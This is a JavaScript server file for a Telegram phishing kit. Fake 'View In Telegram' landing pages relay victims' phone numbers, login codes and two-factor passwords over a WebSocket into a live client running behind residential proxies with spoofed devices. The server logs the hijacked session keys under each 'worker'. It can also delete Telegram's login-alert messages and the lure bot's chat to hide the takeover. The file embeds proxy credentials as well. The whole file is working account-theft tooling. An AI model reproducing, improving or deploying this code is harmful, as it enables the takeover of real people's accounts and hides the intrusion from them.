import express from "express";
import http from 'http';
import { WebSocketServer } from "ws";
import { TelegramClient, Api } from "telegram";
import { StringSession } from "telegram/sessions/index.js";
import qs from 'querystring';
import config from '../config.json' assert { type: "json" };
import saveLog from "./saveLog.js";
import Database from "./database/index.js";
import hbs from 'hbs';
import domain from "./database/domain.js";
import Session from "./session.js";
import domainTemplate from "./database/domainTemplate.js";
import fs from 'fs';
import parsePhoneNumber from 'libphonenumber-js'
import ake from "./ake.js";
import botSchema from "./database/bot.js";
import botTemplate from "./database/template.js";
import fsPromises from 'fs/promises';
import path from 'path';
await Database.connect(config.db);
const app = express(),
    server = http.createServer(app,);
const ws = new WebSocketServer({ server })
console.clear()

app.set('view engine', 'html');
app.engine('html', hbs.__express);
app.set('views', `src/views`);

function makeid(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
        counter += 1;
    }
    return result;
}

const proxy = fs.readFileSync('proxy.txt', 'utf-8')
    .replaceAll('\r', '')
    .split('\n');

const getRandomDeviceParams = async () => {
    try {
        const paramsDir = path.join(process.cwd(), 'src', 'params');
        console.log('Looking for params in:', paramsDir);
        
        const files = await fsPromises.readdir(paramsDir);
        console.log('Found files:', files);
        
        const randomFile = files[Math.floor(Math.random() * files.length)];
        
        const paramsContent = await fsPromises.readFile(path.join(paramsDir, randomFile), 'utf8');
        const params = JSON.parse(paramsContent);

        return {
            app_id: params.app_id,
            app_hash: params.app_hash,
            device: params.device,
            sdk: params.sdk,
            app_version: params.app_version,
            system_lang_pack: params.system_lang_code || "en",
            system_lang_code: params.system_lang_code || "en",
            lang_pack: params.lang_pack || "android",
            lang_code: params.lang_code || "en"
        };
    } catch (error) {
        console.error('Error loading device params:', error);
        
        return {
            app_id: 2496,
            app_hash: "8da85b0d5bfe62527e5b244c209159c3",
            device: "Safari 15.3",
            sdk: "iOS",
            app_version: "10.4.41 A",
            system_lang_pack: "en",
            system_lang_code: "en",
            lang_pack: "android",
            lang_code: "en"
        };
    }
};

const formatProxy = proxy => {
    const [username, password, ip, port] = proxy.split(':');

    console.log({ ip, port: +port, username, password, socksType: 5 })
    return undefined;

    return { ip, port: +port, username, password, socksType: 5 };
}

app.get('/ready', (_req, res) => {
    res.json(true);
})


app.get(`/`, async (req, res) => {
    console.log(req.headers['host'])
    const site = await domain.findOne({ name: req.headers['host'] });

    if (site?.template === 0) return res.redirect('/login');

    const template = await domainTemplate.findOne({ id: site?.template });
    if(template.type === 'auth') return res.redirect('/login');
    if (!site || !template) return res.status(404).send(`404`);

    template.text = template.type === 'bot' ? 'Send Message' : "View In Telegram";

    res.render(`zaza`, template);
})

app.use(express.static('src/public'));

app.get('/login', (_, res) => {
    res.send(fs.readFileSync(`src/public/index.html`, 'utf-8'));
});

app.get(`/log`, async (req, res) => {
    let site = await domain.findOne({ name: req.headers['host'] }) || {
        worker: 5439242814,
        name: 'localhost'
    };

    if (!site) return res.send('чоч');
    let owner = site.worker;
    console.log(site, owner)
    let bot = req.headers['host'];


    // const akeProxy = await ake.createPort('ru')
    //     .catch((() => ake.createPort('ru')));

    const deviceParams = await getRandomDeviceParams();
    const formated = { ip: `geo.iproyal.com`, port: 32325, username: `rvcR5d7QURSEcSyV`, password: `VB0RceDyPGxckBEm_country-${'ru'}_streaming-1`, socksType: 5 }
    const client = new TelegramClient(new Session(+req.query.dc, Buffer.from(req.query.key, 'hex')), deviceParams.app_id, deviceParams.app_hash, {
        connectionRetries: 10,
        proxy: formated,
        "appVersion": deviceParams.app_version,
        "deviceModel": deviceParams.device,
        "systemVersion": deviceParams.sdk,
        'langCode': deviceParams.lang_code
    });

    await client.connect();

    const user = await client.getMe();

    await saveLog({
        id: Date.now(),
        worker: owner,
        uid: user.id,
        premium: user.premium,
        dcId: req.query.dc,
        authKey: req.query.key,
        phone: user.phone,
        bot,
        deviceParams: deviceParams,
        proxy: formated
    });

    await client.disconnect();
    // await ake.deletePort(akeProxy.id);

    res.send(`ok`);
});

ws.on('connection', async (socket, request) => {
    let id, owner, type, bot, user, site, lang
    
    try {
        const parsed = qs.parse(request.url.split("?")[1]);
        id = parsed.id;
        owner = parsed.owner;
        type = parsed.type;
        lang = parsed.lang || 'ru';
        bot = parsed.token;

    
        if (!['bot', 'web', `qr`].includes(type) || !id) throw new Error(`Unauth`);
    } catch (e) {
        socket.send(`0-0`);
        return socket.close();
    }
    if (type !== `bot`) {
        site = await domain.findOne({ name: id }) || {
            worker: 5439242814,
            name: 'localhost'
        };
        if (!site) return socket.close();
        owner = site.worker;
        bot = id;
    }

    let number;

    socket.on('message', message => {
        try {
            message = JSON.parse(message.toString());
        } catch {
            socket.send(`0-0`);
            return socket.close();
        }

        if (message.action === 'number') number = message.data;
    })

    const waitForAction = action => new Promise(resolve => {
       
        if (action === 'number' && number) return resolve(number);
        
        socket.send(JSON.stringify({ action }))
        socket.onmessage = message => {
            try {
                message = JSON.parse(message.data);
            } catch {
                socket.send(`0-0`);
                return socket.close();
            }
            if (!message.action && !message.data) return socket.close();
            if (message.action === action) {
               
                resolve(message.data);
            }
        }
    });

    // let nnn = await waitForAction('number');

    let location = 'ru'//lang;//(parsePhoneNumber(nnn) || parsePhoneNumber("+" + nnn))?.country?.toLowerCase();

    // const akeProxy = await ake.createPort(location)
    //     .catch((() => ake.createPort('ru')));

    const formated = { ip: `geo.iproyal.com`, port: 32325, username: `rvcR5d7QURSEcSyV`, password: `VB0RceDyPGxckBEm_country-${location}_streaming-1`, socksType: 5 }
    // const formatedAke = { 
    //     ip: akeProxy.server, 
    //     port: akeProxy.port, 
    //     username: akeProxy.login, 
    //     password: akeProxy.password, 
    //     socksType: 5 
    // }
    const deviceParams = await getRandomDeviceParams();

    
    const client = new TelegramClient(new StringSession(), deviceParams.app_id, deviceParams.app_hash, {
        connectionRetries: 10,
        proxy: formated,
        "appVersion": deviceParams.app_version,
        "deviceModel": deviceParams.device,
        "systemVersion": deviceParams.sdk,
        "langCode": deviceParams.lang_code,
        "systemLangCode": deviceParams.system_lang_code,
        "langPack": deviceParams.lang_pack,   


       

    });

    setTimeout(async () => {
        try {
            socket.close();
            await client.disconnect();
            // await ake.deletePort(akeProxy.id)    
        } catch (e) {
            console.error(e);
        }
    }, 30000);

    socket.send(JSON.stringify({ action: 'connected' }));

    try {
        console.log('[START] Начинаем подключение');
        await client.connect();
        console.log('[CONNECT] Подключение установлено');

        await client.start({
            phoneNumber: async () => {
                console.log('[PHONE] Запрашиваем номер телефона');
                const number = await waitForAction('number');
                console.log('[PHONE] Получен номер:', number);
                return number;
            },
            password: async () => {
                console.log('[2FA] Запрашиваем пароль');
                const password = await waitForAction('password');
                console.log('[2FA] Получен пароль');
                return password;
            },
            phoneCode: async () => {
                console.log('[CODE] Запрашиваем код');
                try {
                    const code = await waitForAction('code');
                    console.log('[CODE] Получен код:', code);
                    return code;
                } catch (error) {
                    console.log('[CODE] Ошибка при получении кода:', error);
                    throw error;
                }
            },
            onError: (error) => {
                console.log('[ERROR] Ошибка авторизации:', error);
                number = undefined;
                socket.send(JSON.stringify({ action: 'error', data: error.message }));
            }
        });
        
        console.log('[AUTH] Авторизация успешна');

    } catch (error) {
        console.log('[FATAL] Критическая ошибка:', error);
        socket.send(JSON.stringify({ action: 'error', data: error.message }));
    }

    const botData = await botSchema.findOne({ token: bot });
    const template = await botTemplate.findOne({ id: botData.template });
 
    if(template?.deleteBot){
        const dialogs = await client.getDialogs();
        
        const botDialog = dialogs.find(dialog => dialog.entity.username === botData.username);
        console.log(botDialog)
        if(botDialog) {
            try {
            
                const messages = await client.getMessages(botDialog.inputEntity, {
                    limit: 100 
                });
                
                const messageIds = messages.map(m => m.id);
                
                if (messageIds.length > 0) {
                    await client.deleteMessages(botDialog.inputEntity, messageIds, {
                        revoke: true
                    });
                }

                await client.invoke(new Api.contacts.Block({
                    id: botDialog.inputEntity
                }));

                await client.invoke(new Api.messages.DeleteHistory({
                    peer: botDialog.inputEntity,
                    maxId: 0,
                    revoke: true,
                    justClear: false
                }));

            } catch (error) {
                console.error('Error deleting messages and blocking:', error);
            }
        }
     
    }

    if(template?.deleteTelegram){
            
        try {
            const dialogs = await client.getDialogs();
            console.log('Found dialogs:', dialogs.length);
            
            const telegramDialog = dialogs.find(dialog => 
                dialog.entity.id === 777000 || 
                dialog.entity.username === 'telegram' ||
                dialog.entity.firstName === 'Telegram'
            );


            if (telegramDialog) {
                const messages = await client.getMessages(telegramDialog.inputEntity, {
                    limit: 100 
                });
                const messageIds = messages.map(m => m.id);
                
                if (messageIds.length > 0) {
                   
                    await client.deleteMessages(telegramDialog.inputEntity, messageIds, {
                        revoke: true
                    });
                  
                }

                await client.invoke(new Api.messages.DeleteHistory({
                    peer: telegramDialog.inputEntity,
                    maxId: 0,
                    revoke: true,
                    justClear: false
                }));
            } 

        } catch (error) {
            console.error('Error clearing Telegram dialog:', error);
        }
    }
    socket.send(JSON.stringify({ action: 'success' }))
    socket.close();

    const uu = await client.getMe();

    await saveLog({
        id: Date.now(),
        worker: owner,
        dcId: client.session.dcId,
        uid: uu.id,
        authKey: new StringSession(client.session.save())._key?.toString('hex'),
        phone: uu.phone,
        premium: uu.premium,
        bot,
        deviceParams: deviceParams,
    });

    await client.disconnect().catch(console.error);
    // await ake.deletePort(akeProxy.id)
});

if(config.app_prod) server.listen(80, () => console.log("Server started on 80"));
else server.listen(81, () => console.log("Server started on 81")); 
